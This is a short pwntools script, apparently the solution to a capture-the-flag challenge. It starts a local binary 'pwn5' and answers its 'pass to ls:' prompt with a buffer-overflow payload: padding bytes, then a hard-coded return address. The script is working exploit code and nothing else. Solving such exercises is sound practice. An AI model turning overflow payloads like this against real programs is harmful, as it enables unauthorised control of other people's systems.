from pwn import *


t = process('./pwn5')

payload = 'AAAABBBBCCCCDDDDEEEEF\x7c\x88\x04\x08AAAA\x68\x73'

t.recvuntil('pass to ls:')

t.sendline(payload)

log.info(t.recvall())
